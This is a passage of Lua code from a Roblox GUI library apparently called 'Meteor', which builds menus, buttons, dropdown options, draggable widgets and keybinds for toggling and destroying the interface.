            b_Background.ZIndex = B_IndexOffset
            b_Background.Parent = self.Menu
            
             b_EnableEffect = instNew('Frame')
             b_EnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
             b_EnableEffect.BackgroundTransparency = 1
             b_EnableEffect.BorderSizePixel = 0
             b_EnableEffect.ClipsDescendants = true
             b_EnableEffect.Size = dimNew(1,0,1,0)
             b_EnableEffect.ZIndex = B_IndexOffset
             b_EnableEffect.Parent = b_Background
            
             b_Text = instNew('TextLabel')
             b_Text.BackgroundTransparency = 1
             b_Text.Font = RLTHEMEFONT
             b_Text.Position = dimOffset(10, 0)
             b_Text.Size = dimNew(1, -10, 1, 0)
             b_Text.Text = text
             b_Text.TextColor3 = RLTHEMEDATA['tm'][1]
             b_Text.TextSize = 18
             b_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             b_Text.TextStrokeTransparency = 0
             b_Text.TextXAlignment = 'Left'
             b_Text.ZIndex = B_IndexOffset
             b_Text.Parent = b_Background
             
              b_TextPadding = instNew('UIPadding')
              b_TextPadding.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
              b_TextPadding.Parent = b_Text
                
             
             b_Icon = instNew('ImageLabel')
             b_Icon.AnchorPoint = vec2(1,0.5)
             b_Icon.BackgroundTransparency = 1
             b_Icon.Position = dimNew(1,-4, 0.5, 0)
             b_Icon.Rotation = 0
             b_Icon.Size = dimOffset(12, 12)
             b_Icon.Image = 'rbxassetid://8997446977'
             b_Icon.ImageColor3 = RLTHEMEDATA['tm'][1]
             b_Icon.ZIndex = B_IndexOffset
             b_Icon.Parent = b_Background
        end
            
        local B_Object = {} do 
            B_Object.Tooltip = nil
            
            
            B_Object.Flags = {} do 
                B_Object.Flags['Clicked'] = true
            end
            
            B_Object.Effect = b_EnableEffect
            
            B_Object.Name = text
            B_Object.ZIndex = B_IndexOffset
            
            B_Object.Click = base_class.module_click_self
            
            B_Object.Connect = base_class.generic_connect
            B_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            b_Background.InputBegan:Connect(function(io) 
                local uitv = io.UserInputType.Value
                if (uitv == 0) then
                    B_Object:Click()
                    return
                end
            end)
            
            b_Background.MouseEnter:Connect(function() 
                b_Background.BackgroundColor3 = RLTHEMEDATA['hs'][1]
                
                
                local tt = B_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = B_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            b_Background.MouseLeave:Connect(function() 
                b_Background.BackgroundColor3 = RLTHEMEDATA['bs'][1] 
                
                if (w_Tooltip.Text == B_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
        end
        
        return B_Object
    end
    base_class.dropdown_create_option = function(self, text) 
        text = tostring(text)
        local O_IndexOffset = self.ZIndex + 1
        
        local o_Option
         local o_Text
          local o_TextPadding
         local o_EnableEffect
         local o_EnableEffect2
        
        do
            o_Option = instNew('Frame')
            o_Option.BackgroundColor3 = RLTHEMEDATA['bd'][1]
            o_Option.BackgroundTransparency = RLTHEMEDATA['bd'][2]
            o_Option.BorderSizePixel = 0
            o_Option.Size = dimNew(1, 0, 0, 25)
            o_Option.ZIndex = O_IndexOffset
            o_Option.Parent = self.Menu
             
             o_Text = instNew('TextLabel')
             o_Text.BackgroundTransparency = 1
             o_Text.Font = RLTHEMEFONT
             o_Text.Size = dimScale(1,1)
             o_Text.Text = text
             o_Text.TextColor3 = RLTHEMEDATA['tm'][1]
             o_Text.TextSize = 18
             o_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             o_Text.TextStrokeTransparency = 0
             o_Text.TextXAlignment = 'Left'
             o_Text.ZIndex = O_IndexOffset
             o_Text.Parent = o_Option
             
             o_TextPadding = instNew('UIPadding')
             o_TextPadding.PaddingLeft = dimOffset(IndentLevel3, 0).X -- LEFT PADDING 3
             o_TextPadding.Parent = o_Text
             
             o_EnableEffect = instNew('Frame')
             o_EnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
             o_EnableEffect.BackgroundTransparency = 0.96
             o_EnableEffect.BorderSizePixel = 0
             o_EnableEffect.ClipsDescendants = true
             o_EnableEffect.Size = dimNew(0,0,1,0)
             o_EnableEffect.ZIndex = O_IndexOffset
             o_EnableEffect.Parent = o_Option
             
              o_EnableEffect2 = instNew('Frame')
              o_EnableEffect2.BackgroundColor3 = RLTHEMEDATA['ge'][1]
              o_EnableEffect2.Size = dimNew(0,2,1,0)
              o_EnableEffect2.BorderSizePixel = 0
              o_EnableEffect2.ZIndex = O_IndexOffset
              o_EnableEffect2.Parent = o_EnableEffect
        end
            
        local O_Object = {} do 
            O_Object.Tooltip = nil
            O_Object.Selected = false
            
            O_Object.Name = text
            O_Object.Parent = self
            
            O_Object.Effect = o_EnableEffect
            
            O_Object.Select = base_class.s_ddoption_select_self
            O_Object.Deselect = base_class.s_ddoption_deselect_self
            
            O_Object.getState = base_class.s_ddoption_selected_getstate
            O_Object.IsSelected = base_class.s_ddoption_selected_getstate
            
            O_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            o_Option.InputBegan:Connect(function(io) 
                local uitv = io.UserInputType.Value
                if (uitv == 0 or uitv == 1) then
                    O_Object:Select()
                    return
                end
            end)
            
            o_Option.MouseEnter:Connect(function() 
                o_Option.BackgroundColor3 = RLTHEMEDATA['hd'][1]
                
                local tt = O_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = O_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            o_Option.MouseLeave:Connect(function() 
                o_Option.BackgroundColor3 = RLTHEMEDATA['bd'][1]
                
                if (w_Tooltip.Text == O_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
        end
        
        tabInsert(self.Objects, O_Object)
        return O_Object
    end
    
    base_class.widget_create_label = function(self, text) 
        local WidgetLabel = instNew('TextLabel')
        WidgetLabel.BackgroundTransparency = 1
        WidgetLabel.Font = RLTHEMEFONT
        WidgetLabel.RichText = true
        WidgetLabel.TextColor3 = RLTHEMEDATA['tm'][1]
        WidgetLabel.TextSize = 20
        WidgetLabel.TextStrokeColor3 = RLTHEMEDATA['to'][1]
        WidgetLabel.TextStrokeTransparency = 0
        WidgetLabel.ZIndex = self.Index
        WidgetLabel.Parent = self.Frame
        
        local bl = {}
        bl['BackgroundTransparency'] = true
        bl['Font'] = true
        bl['TextColor3'] = true
        bl['TextStrokeColor3'] = true
        bl['TextStrokeTransparency'] = true
        bl['ZIndex'] = true
        bl['Parent'] = true
        
        
        local mt = setmetatable({}, {
            __index = function(a,b) 
                return WidgetLabel[b] 
            end;
            
            __newindex = function(part, prop, val) 
                if (bl[prop] == nil) then
                    WidgetLabel[prop] = val
                elseif (prop == 'SELF') then
                    return WidgetLabel
                end
            end;
            
            __metatable = 'the j :skull:'
        })
        
        return mt
    end
    
    
end
-- UI functions
function ui:newMenu(text) 
    loadSettings()
    local M_Id = #ui_Menus+1
    local M_IndexOffset = 50+(M_Id * 15)
    
    local m_Header
     local m_HeaderEnableEffect
     local m_HeaderText
     local m_HeaderIcon
     
     local m_Menu
      local m_MenuListLayout
    
    m_Header = instNew('ImageButton')
    m_Header.Active = true
    m_Header.AutoButtonColor = false
    m_Header.BackgroundColor3 = RLTHEMEDATA['bm'][1]
    m_Header.BackgroundTransparency = RLTHEMEDATA['bm'][2]
    m_Header.BorderSizePixel = 0
    m_Header.ClipsDescendants = false
    m_Header.Size = dimOffset(1366 < 1500 and 170 or 300, 30)
    local FinalPosition do 
    local MenusPerRow = mathFloor(((monitor_resolution.X-100) / 200))
    FinalPosition = dimOffset(60+(((M_Id-1)%MenusPerRow)*(200)), 80+150*(mathFloor((M_Id-1)/MenusPerRow)))
    end
    
    
    m_Header.Position = FinalPosition
        
    
    
    --dimOffset((0.1*((M_Id-1)%6) * monitor_resolution.X)+(100*((M_Id-1)%6)+100), 0)
    m_Header.ZIndex = M_IndexOffset+2
    m_Header.Parent = w_ModFrame
    
    
    
     m_HeaderEnableEffect = instNew('Frame')
     m_HeaderEnableEffect.BackgroundColor3 = RLTHEMEDATA['ge'][1]
     m_HeaderEnableEffect.Size = dimNew(0,0,1,0)
     m_HeaderEnableEffect.BorderSizePixel = 0
     m_HeaderEnableEffect.ZIndex = M_IndexOffset+2
     m_HeaderEnableEffect.Parent = m_Header
    
     m_HeaderText = instNew('TextLabel')
     m_HeaderText.Size = dimNew(1, 0, 1, 0)
     m_HeaderText.Position = dimOffset(0, 0)
     m_HeaderText.BackgroundTransparency = 1
     m_HeaderText.Font = RLTHEMEFONT
     m_HeaderText.TextXAlignment = 'Center'
     m_HeaderText.TextColor3 = RLTHEMEDATA['tm'][1]
     m_HeaderText.TextSize = 22
     m_HeaderText.Text = text
     m_HeaderText.TextStrokeTransparency = 0
     m_HeaderText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
     m_HeaderText.ZIndex = M_IndexOffset+2
     m_HeaderText.Parent = m_Header
     
     m_HeaderIcon = instNew('ImageLabel')
     m_HeaderIcon.Size = dimOffset(30, 30)
     m_HeaderIcon.Position = dimScale(1,0)
     m_HeaderIcon.AnchorPoint = vec2(1,0)
     m_HeaderIcon.BackgroundTransparency = 1
     m_HeaderIcon.ImageColor3 = RLTHEMEDATA['tm'][1]
     m_HeaderIcon.Image = 'rbxassetid://7184113125'
     m_HeaderIcon.Rotation = 180
     m_HeaderIcon.ZIndex = M_IndexOffset+2
     m_HeaderIcon.Parent = m_Header
    m_Menu = instNew('Frame')
    m_Menu.AutomaticSize = 'Y'
    m_Menu.BackgroundColor3 = RLTHEMEDATA['bo'][1]
    m_Menu.BackgroundTransparency = 1--RLTHEMEDATA['bo'][2]
    m_Menu.BorderSizePixel = 0
    m_Menu.Position = dimOffset(0, 30)
    m_Menu.Size = dimNew(1,0,0,0)
    m_Menu.Visible = false
    m_Menu.ZIndex = M_IndexOffset
    m_Menu.Parent = m_Header
    
     m_MenuListLayout = instNew('UIListLayout')
     m_MenuListLayout.FillDirection = 'Vertical'
     m_MenuListLayout.HorizontalAlignment = 'Left'
     m_MenuListLayout.VerticalAlignment = 'Top'
     m_MenuListLayout.Parent = m_Menu
    
     
    stroke(m_Header)
    stroke(m_Menu)
    
    
    
    
    local M_Object = {} do 
        M_Object.MToggled = false
        M_Object.Menu = m_Menu
        M_Object.Icon = m_HeaderIcon
        M_Object.ZIndex = M_IndexOffset
        M_Object.Enabled = m_HeaderEnableEffect
        M_Object.Name = text
        
        M_Object.addMod = base_class.menu_create_module
        
        
        M_Object.Enable = base_class.menu_enable
        M_Object.Disable = base_class.menu_disable
        M_Object.Toggle = base_class.menu_toggle
        M_Object.getState = base_class.menu_getstate
    end
    
    
    do
        if not Configs[text] then
            Configs[text] = {["MenuToggled"] = ""}
        end
        if Configs[text] then
            if Configs[text]["MenuToggled"] == true then
                M_Object:Toggle()
            end
        end
        
        
        local prevclicktime = 0
        local id = 'menu-'..M_Id
        
        
        
        m_Header.InputBegan:Connect(function(io) 
            -- Header got input; check type
            local uitv = io.UserInputType.Value
            
            -- If left clicking then do stuff
            if (uitv == 0) then
                -- Check double click debounce
                local currclicktime = tick()
                if (currclicktime - prevclicktime < 0.2) then
                    M_Object:Toggle()
                end
                prevclicktime = currclicktime
                
                -- Start dragging logic
                
                local root_pos = m_Header.AbsolutePosition -- Get the original header position
                local start_pos = io.Position -- Get start input position; this will be used for a "delta" position
                start_pos = vec2(start_pos.X, start_pos.Y) -- Convert it to a vec2 so it can be used easier
                
                local destination = vec2(root_pos.X, root_pos.Y) + monitor_inset -- Get the wanted destination; this will be used for custom tweening
                -- (normal roblox tweening works fine, but i believe custom is more performant)
                servRun:BindToRenderStep(M_Id, 2000, function(dt) -- "Tween" code
                    m_Header.Position = m_Header.Position:lerp(dimOffset(destination.X, destination.Y), 1 - 1e-9^(dt)) -- Lerp the position
                    
                    -- value = lerp(target, value, exp2(-rate*deltaTime))
                end)
                -- Connect to mouse movement
                ui_Connections[id] = servInput.InputChanged:Connect(function(io) 
                    -- Check if the input is a mouse movement
                    if (io.UserInputType.Value == 4) then
                        -- If so then get the mouse position
                        local curr_pos = io.Position
                        -- Convert it to a vec2
                        curr_pos = vec2(curr_pos.X, curr_pos.Y)
                        -- Get the new destination (original position + input delta + inset)
                        destination = root_pos + (curr_pos - start_pos) + monitor_inset
                        
                        --twn(m_Header, {Position = dimOffset(destination.X, destination.Y)})
                    end
                end)
                
            -- If its not mouse1, check if its a right click
            elseif (uitv == 1) then
                -- Toggle if it is
                M_Object:Toggle()
            end
        end)
        m_Header.InputEnded:Connect(function(io) 
            if (io.UserInputType.Value == 0) then
                local a = ui_Connections[id]
                if (a) then a:Disconnect() end
                servRun:UnbindFromRenderStep(M_Id)
            end
        end)
        
        m_Header.MouseEnter:Connect(function() 
            m_Header.BackgroundColor3 = RLTHEMEDATA['hm'][1]
        end)
        
        m_Header.MouseLeave:Connect(function() 
            m_Header.BackgroundColor3 = RLTHEMEDATA['bm'][1]
        end)
    end
    
    
    
    tabInsert(ui_Menus, M_Object)
    return M_Object
end
function ui:CreateWidget(Name, Position, Size, InMeteorWindow) 
    local W_Id = #ui_Widgets+1
    local W_IndexOffset = 25+(W_Id * 15)
    
    
    local w_Header
    local w_Main
    
    w_Header = instNew('TextLabel')
    w_Header.BackgroundColor3 = RLTHEMEDATA['bm'][1]
    w_Header.BackgroundTransparency = RLTHEMEDATA['bm'][2]
    w_Header.BorderSizePixel = 0
    w_Header.Font = RLTHEMEFONT
    w_Header.Position = Position
    w_Header.RichText = true
    w_Header.Size = dimOffset(Size.X, 21)
    w_Header.Text = Name
    w_Header.TextColor3 = RLTHEMEDATA['tm'][1]
    w_Header.TextSize = 19
    w_Header.TextStrokeColor3 = RLTHEMEDATA['to'][1]
    w_Header.TextStrokeTransparency = 0
    w_Header.TextXAlignment = 'Center'
    w_Header.Visible = true 
    w_Header.ZIndex = W_IndexOffset
    w_Header.Parent = InMeteorWindow and w_ModFrame or w_Main
    
    stroke(w_Header, 'Border')
    
    w_Main = instNew('Frame')
    w_Main.BackgroundColor3 = RLTHEMEDATA['gw'][1]
    w_Main.BackgroundTransparency = RLTHEMEDATA['gw'][2]
    w_Main.BorderSizePixel = 0
    w_Main.Position = dimOffset(0, 21)
    w_Main.Size = dimNew(1, 0, 1, Size.Y-21)
    w_Main.Visible = true 
    w_Main.ZIndex = W_IndexOffset
    w_Main.Parent = w_Header
    
    stroke(w_Main, 'Border')
    
    local WidgetObject = {} do 
        WidgetObject.Frame = w_Main
        WidgetObject.Name = Name
        WidgetObject.Index = W_IndexOffset
        WidgetObject.Header = w_Header
        
        WidgetObject.CreateLabel = widget_create_label
        WidgetObject.Colors = {}
        WidgetObject.Colors.Text = RLTHEMEDATA['tm'][1]
        WidgetObject.Colors.TextStroke = RLTHEMEDATA['to'][1]
    end
    do 
        local id = 'wid-'..W_Id
        
        w_Header.InputBegan:Connect(function(io) 
            -- Header got input; check type
            local uitv = io.UserInputType.Value
            
            -- If left clicking then do stuff
            if (uitv == 0) then
                -- Start dragging logic
                
                local root_pos = w_Header.AbsolutePosition -- Get the original header position
                local start_pos = io.Position -- Get start input position; this will be used for a "delta" position
                start_pos = vec2(start_pos.X, start_pos.Y) -- Convert it to a vec2 so it can be used easier
                
                local destination = vec2(root_pos.X, root_pos.Y) + monitor_inset -- Get the wanted destination; this will be used for custom tweening
                -- (normal roblox tweening works fine, but i believe custom is more performant)
                servRun:BindToRenderStep(W_Id, 2000, function() -- "Tween" code
                    w_Header.Position = w_Header.Position:lerp(dimOffset(destination.X, destination.Y), 0.3) -- Lerp the position
                end)
                -- Connect to mouse movement
                ui_Connections[id] = servInput.InputChanged:Connect(function(io) 
                    -- Check if the input is a mouse movement
                    if (io.UserInputType.Value == 4) then
                        -- If so then get the mouse position
                        local curr_pos = io.Position
                        -- Convert it to a vec2
                        curr_pos = vec2(curr_pos.X, curr_pos.Y)
                        -- Get the new destination (original position + input delta + inset)
                        destination = root_pos + (curr_pos - start_pos) + monitor_inset
                    end
                end)
            end
        end)
        w_Header.InputEnded:Connect(function(io) 
            if (io.UserInputType.Value == 0) then
                local a = ui_Connections[id]
                if (a) then a:Disconnect() end
                servRun:UnbindFromRenderStep(W_Id)
            end
        end)
    
    end
    return WidgetObject
end
function ui:Destroy() 
    pcall(ui.Flags.Destroying)
    
    
    -- Destroy
    local _ = w_Screen.Parent
    w_Screen:Destroy()
    
    -- Unbinds
    servContext:UnbindAction('RL-ToggleMenu')
    servContext:UnbindAction('RL-Destroy')
    
    -- Disconnections
    
    for i,v in pairs(ui_Connections) do 
        v:Disconnect() 
    end
    
    -- Variable clearing
    gradient,getnext,stroke,round,uierror = nil,nil,nil,nil,nil
    ui_Menus = nil
    
    _G.RLLOADED = false
    _G.RLTHEME = nil
    _G.RLTHEMEDATA = nil
    _G.RLTHEMEFONT = nil
    _G.RLLOADERROR = nil
    
    writefile('Meteor/Queued.txt','')
    
    local sound = instNew('Sound')
    sound.SoundId = 'rbxassetid://9009668475'
    sound.Volume = 1
    sound.TimePosition = 0.02
    sound.Parent = _
    sound:Play()
    sound.Ended:Connect(function() 
        sound:Destroy()
    end)
    
end
function ui:GetModules() 
    return ui_Modules
end
function ui:GetScreen() 
    return w_Screen 
end
function ui:GetModframe() 
    return w_ModFrame
end
    
ui.Flags = {}
ui.Flags.Destroying = true
ui.Connect = base_class.generic_connect
-- Gui binds
local OldIconEnabled = servInput.MouseIconEnabled
servContext:BindActionAtPriority('RL-ToggleMenu',function(_,uis) 
    
    if (uis.Value == 0) then
        W_WindowOpen = not W_WindowOpen
        
        if (W_WindowOpen) then
            servInput.MouseIconEnabled = false
            w_MouseCursor.ImageTransparency = 0
            
            w_Backframe.Visible = true
            twn(w_Backframe, {Size = dimScale(1, 1)}, true)
        else
            servInput.MouseIconEnabled = OldIconEnabled
            w_MouseCursor.ImageTransparency = 1
            
            
            local j = twn(w_Backframe, {Size = dimScale(1, 0)}, true)
            j.Completed:Wait()
            if j.PlaybackState == 4 then
                w_Backframe.Visible = false
            end 
        end
    end
end,false,999999,Enum.KeyCode.RightShift)
servContext:BindActionAtPriority('RL-Destroy',function(_,uis) 
    if (uis.Value == 0) then
        ui:Destroy()
	for i,v in pairs(ui_Connections) do 
            v:Disconnect() 
        end
    end
end,false,999999,Enum.KeyCode.RightControl)
-- Auto collection
delay(5, function() 
    if (ui_Menus ~= nil and #ui_Menus == 0) then
        ui:Destroy()
        warn'[METEOR] Failure to clean library resources!\nAutomatically cleared for you; make sure to\ncall ui:Destroy() when finished'
    end
end)
end
return ui